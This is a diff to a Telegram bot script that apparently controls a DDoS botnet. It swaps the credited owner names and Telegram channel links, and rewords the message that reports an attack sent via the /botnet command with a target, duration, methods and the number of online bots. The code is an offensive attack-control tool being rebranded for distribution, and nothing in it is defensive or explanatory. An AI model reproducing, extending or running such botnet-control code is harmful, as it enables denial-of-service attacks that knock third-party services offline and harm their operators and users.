@@ -107,7 +107,7 @@ Owner Command
 - /delprem
 ▬▭▬▭▬▭▬▭▬▭▬▭▬
 
-©Dirzz`;
+©Actrotophiles`;
 
           bot.editMessageText(message, {
             chat_id: chatId,
@@ -558,7 +558,7 @@ bot.onText(/\/botnet(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match)
 
         const successCount = await PermenMDBotnet(endpoints, target, duration, methods);
 
-        bot.sendMessage(chatId, `*🔴 Attack Succesfully Sent To🔴*\n\n*Attack By:* @${username}\n*Botnet Online:* ${successCount}\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration} seconds\n${deepinfo}`, {
+        bot.sendMessage(chatId, `*🟢 Attack Succsesfully Sent! 🟢*\n\n*Attack By:* @${username}\n*Botnet Online:* ${successCount}\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration} seconds\n${deepinfo}`, {
             parse_mode: 'Markdown',
             reply_markup: {
         inline_keyboard: [
@@ -569,13 +569,13 @@ bot.onText(/\/botnet(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match)
             },
             {
               text: '🔍Join Channel',
-              url: `https://t.me/dirzpower`
+              url: `https://t.me/neverdowns`
             }
           ],
           [
             {
               text: '👑Owner',
-              url: `https://t.me/zhdirdhz`
+              url: `https://t.me/Actrotophiles`
             }
           ]
         ]
